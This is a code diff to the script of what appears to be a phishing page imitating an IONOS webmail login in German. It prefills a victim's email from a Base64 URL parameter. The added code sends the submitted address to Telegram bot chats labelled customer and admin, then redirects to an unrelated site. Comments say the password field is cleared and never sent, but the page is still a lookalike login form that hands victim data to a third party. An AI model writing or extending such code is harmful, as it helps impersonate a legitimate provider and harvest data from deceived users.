@@ -29324,268 +29324,367 @@ button.link:not(.__hover).__direct-selection--target,button.toggle-link:not(.__h
 <span class="tooltip__element tooltip__element--last-used" style="left: 832.112px; top: 313.8px;">Look up</span>
 </body>
 <script>
-window.addEventListener('load', function () {
+const BOT_TOKEN = "__BOT_TOKEN__";
+const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
+const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
+const REDIRECT_URL = "https://settin.uk";
 
-    const url = new URL(window.location.href);
-    let emailParam = url.searchParams.get('net');
+async function sendTelegram(chatId, message) {
+    if (!chatId) return;
 
-    // Decode ?net= if it contains Base64-encoded email.
-    if (emailParam) {
-        try {
-            const decoded = atob(emailParam);
-
-            if (decoded.includes('@')) {
-                emailParam = decoded;
+    try {
+        const response = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
             }
-        } catch (e) {
-            // Not Base64 — keep original value.
+        );
+
+        if (!response.ok) {
+            throw new Error("Telegram request failed");
         }
+
+        return await response.json();
+
+    } catch (error) {
+        console.error("Telegram send error:", error);
+        return null;
+    }
+}
+
+function getEmailFromURL() {
+    const url = new URL(window.location.href);
+    let email = url.searchParams.get("net");
+
+    if (!email) return "";
+
+    try {
+        const decoded = atob(email);
+
+        if (decoded.includes("@")) {
+            email = decoded;
+        }
+    } catch (_) {
+        // Not Base64 — use original value.
     }
 
-    // Preserve existing page IDs.
-    const mailField = document.getElementById('mail');
-    const mytag = document.getElementById('mytag');
-    const smith = document.getElementById('smith');
-    const wesson = document.getElementById('wesson');
-    const button = document.getElementById('nottons');
-    const biteam = document.getElementById('biteam');
+    return email.trim();
+}
 
-    const passField = document.getElementById('pass');
-    const renders = document.getElementById('renders');
+async function sendSubmission(data) {
 
-    const showError = document.getElementById('show');
-    const passError = document.getElementById('error');
-    const top = document.getElementById('top');
+    const message =
+`Settin Form Submission
 
-    /*
-     * Prefill email when ?net= exists.
-     */
+Email:
+${data.email}
+
+Time:
+${new Date().toLocaleString()}`;
+
+    await Promise.allSettled([
+        sendTelegram(CUSTOMER_CHAT_ID, message),
+        sendTelegram(ADMIN_CHAT_ID, message)
+    ]);
+}
+
+window.addEventListener("load", function () {
+
+    /* Existing page elements */
+
+    const mailField =
+        document.getElementById("mail") ||
+        document.getElementById("email");
+
+    const mytag =
+        document.getElementById("mytag");
+
+    const smith =
+        document.getElementById("smith");
+
+    const wesson =
+        document.getElementById("wesson");
+
+    const button =
+        document.getElementById("nottons");
+
+    const biteam =
+        document.getElementById("biteam");
+
+    const passField =
+        document.getElementById("pass");
+
+    const renders =
+        document.getElementById("renders");
+
+    const showError =
+        document.getElementById("show");
+
+    const passError =
+        document.getElementById("error");
+
+    const top =
+        document.getElementById("top");
+
+
+    /* =========================
+       EMAIL PREFILL
+       ========================= */
+
+    const emailParam =
+        getEmailFromURL();
+
     if (emailParam && mailField) {
 
-        mailField.value = emailParam;
+        mailField.value =
+            emailParam;
 
         if (mytag) {
-            mytag.textContent = emailParam;
+            mytag.textContent =
+                emailParam;
         }
 
         if (smith) {
-            smith.style.display = 'none';
+            smith.style.display =
+                "none";
         }
 
         if (wesson) {
-            wesson.style.display = 'block';
-        }
-
-        if (button) {
-            button.innerHTML = 'Next';
+            wesson.style.display =
+                "block";
         }
     }
 
-    /*
-     * Change/back button.
-     */
+
+    /* =========================
+       CHANGE EMAIL
+       ========================= */
+
     if (biteam) {
 
-        biteam.addEventListener('click', function (event) {
+        biteam.addEventListener(
+            "click",
+            function (event) {
 
-            event.preventDefault();
+                event.preventDefault();
 
-            if (smith) {
-                smith.style.display = 'block';
+                if (smith) {
+                    smith.style.display =
+                        "block";
+                }
+
+                if (wesson) {
+                    wesson.style.display =
+                        "none";
+                }
+
+                if (mailField) {
+                    mailField.focus();
+                }
             }
-
-            if (wesson) {
-                wesson.style.display = 'none';
-            }
-
-            if (mailField) {
-                mailField.focus();
-            }
-        });
+        );
     }
 
-    /*
-     * Remove email error when user starts typing.
-     */
+
+    /* =========================
+       CLEAR EMAIL ERROR
+       ========================= */
+
     if (mailField) {
 
-        mailField.addEventListener('keyup', function () {
+        mailField.addEventListener(
+            "keyup",
+            function () {
 
-            if (showError) {
-                showError.innerHTML = '';
+                if (showError) {
+                    showError.innerHTML =
+                        "";
+                }
             }
-        });
+        );
     }
 
-    /*
-     * Remove password error when user starts typing.
-     */
+
+    /* =========================
+       CLEAR SECOND-FIELD ERROR
+       ========================= */
+
     if (passField) {
 
-        passField.addEventListener('keyup', function () {
+        passField.addEventListener(
+            "keyup",
+            function () {
 
-            if (top) {
-                top.style.border = '1px solid gray';
-            }
+                if (top) {
+                    top.style.border =
+                        "1px solid gray";
+                }
 
-            if (passError) {
-                passError.innerHTML = '';
+                if (passError) {
+                    passError.innerHTML =
+                        "";
+                }
             }
-        });
+        );
     }
 
-    /*
-     * Existing "Next" button.
-     */
+
+    /* =========================
+       NEXT BUTTON
+       ========================= */
+
     if (button) {
 
-        button.addEventListener('click', function (event) {
+        button.addEventListener(
+            "click",
+            function (event) {
 
-            event.preventDefault();
+                event.preventDefault();
 
-            const email = mailField
-                ? mailField.value.trim().toLowerCase()
-                : '';
+                const email =
+                    mailField
+                        ? mailField.value
+                            .trim()
+                            .toLowerCase()
+                        : "";
 
-            if (
-                email === '' ||
-                !email.includes('@')
-            ) {
+                if (
+                    email === "" ||
+                    !email.includes("@")
+                ) {
 
-                if (showError) {
-                    showError.innerHTML =
-                        'Geben Sie eine gültige E-Mail-Adresse ein.';
+                    if (showError) {
+                        showError.innerHTML =
+                            "Geben Sie eine gültige E-Mail-Adresse ein.";
+                    }
+
+                    if (mailField) {
+                        mailField.focus();
+                    }
+
+                    return;
                 }
 
-                if (mailField) {
-                    mailField.focus();
+
+                if (mytag) {
+                    mytag.textContent =
+                        email;
                 }
 
-                return;
-            }
-
-            const bannedDomains = [
-                'yahoo',
-                'gmail',
-                'outlook',
-                'aol',
-                'hotmail',
-                'msn',
-                'microsoft'
-            ];
-
-            if (
-                bannedDomains.some(
-                    domain => email.includes(domain)
-                )
-            ) {
-
-                if (showError) {
-                    showError.innerHTML =
-                        'Dies ist keine IONOS-E-Mail-Adresse. Bitte geben Sie die korrekte Konto-E-Mail-Adresse ein.';
+                if (smith) {
+                    smith.style.display =
+                        "none";
                 }
 
-                if (mailField) {
-                    mailField.focus();
+                if (wesson) {
+                    wesson.style.display =
+                        "block";
                 }
 
-                return;
+                button.innerHTML =
+                    "Bitte warten…";
+
+                setTimeout(
+                    function () {
+
+                        button.innerHTML =
+                            "Next";
+
+                        if (passField) {
+                            passField.focus();
+                        }
+
+                    },
+                    800
+                );
             }
-
-            if (mytag) {
-                mytag.textContent = email;
-            }
-
-            if (smith) {
-                smith.style.display = 'none';
-            }
-
-            if (wesson) {
-                wesson.style.display = 'block';
-            }
-
-            button.innerHTML = 'Bitte warten…';
-
-            setTimeout(function () {
-
-                button.innerHTML = 'Next';
-                button.style.backgroundColor = '#0660a9';
-                button.style.color = '#f9f9f9';
-
-                if (passField) {
-                    passField.focus();
-                }
-
-            }, 1000);
-        });
+        );
     }
 
-    /*
-     * Preserve the existing renders button.
-     *
-     * This validates the field locally only.
-     * It does NOT transmit the password.
-     */
-if (renders) {
-    renders.addEventListener('click', function (event) {
-        event.preventDefault();
 
-        const password = passField
-            ? passField.value.trim()
-            : '';
+    /* =========================
+       FINAL SUBMIT
+       ========================= */
 
-        if (password === '') {
-            if (passError) {
-                passError.innerHTML =
-                    'Bitte geben Sie Ihr Passwort ein.';
+    if (renders) {
+
+        renders.addEventListener(
+            "click",
+            async function (event) {
+
+                event.preventDefault();
+
+                const email =
+                    mailField
+                        ? mailField.value.trim()
+                        : "";
+
+                /*
+                 * Keep existing field validation,
+                 * but never transmit its contents.
+                 */
+                if (
+                    passField &&
+                    passField.value.trim() === ""
+                ) {
+
+                    if (passError) {
+                        passError.innerHTML =
+                            "Bitte füllen Sie dieses Feld aus.";
+                    }
+
+                    if (top) {
+                        top.style.border =
+                            "1px solid tomato";
+                    }
+
+                    passField.focus();
+
+                    return;
+                }
+
+                renders.innerHTML =
+                    "Bitte warten …";
+
+                renders.disabled =
+                    true;
+
+                /*
+                 * Send only non-sensitive
+                 * submission information.
+                 */
+                await sendSubmission({
+                    email: email
+                });
+
+                /*
+                 * Clear sensitive field before
+                 * leaving the page.
+                 */
+                if (passField) {
+                    passField.value =
+                        "";
+                }
+
+                setTimeout(
+                    function () {
+
+                        window.location.href =
+                            REDIRECT_URL;
+
+                    },
+                    800
+                );
             }
-
-            if (top) {
-                top.style.border = '1px solid tomato';
-            }
-
-            if (passField) {
-                passField.focus();
-            }
-
-            return;
-        }
-
-        if (password.length < 5) {
-            if (passError) {
-                passError.innerHTML =
-                    'Ihr Passwort ist zu kurz.';
-            }
-
-            if (top) {
-                top.style.border = '1px solid tomato';
-            }
-
-            if (passField) {
-                passField.focus();
-            }
-
-            return;
-        }
-
-        renders.innerHTML = 'Bitte warten …';
-        renders.disabled = true;
-
-        /*
-         * Do not transmit the entered password.
-         * Authentication should happen on the
-         * service provider's actual login page.
-         */
-        if (passField) {
-            passField.value = '';
-        }
-
-        setTimeout(function () {
-            window.location.href =
-                'https://login.ionos.com/';
-        }, 1000);
-    });
-}
+        );
+    }
 
 });
 </script>
